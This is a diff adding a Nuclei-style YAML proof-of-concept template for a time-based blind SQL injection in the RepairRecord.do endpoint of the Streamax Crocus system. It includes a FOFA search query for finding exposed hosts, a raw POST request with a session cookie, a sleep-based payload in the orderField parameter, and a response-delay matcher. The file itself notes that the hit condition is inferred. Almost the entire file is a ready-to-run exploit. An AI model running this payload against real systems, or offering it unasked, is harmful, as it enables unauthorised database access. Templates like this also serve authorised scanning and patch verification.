@@ -1,0 +1,33 @@
+id: poc-gki2nrshkfhgotnk
+info:
+  name: 锐明技术Crocus系统RepairRecord存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gki2nrshkfhgotnk
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gki2nrshkfhgotnk
+    fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+http:
+- raw:
+  - 'POST /RepairRecord.do?Action=QueryLast HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 163
+
+    Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    EndTime=2025-01-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2025-11-26+00%3A00%3A00&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(5),1))a)&orderType=asc'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
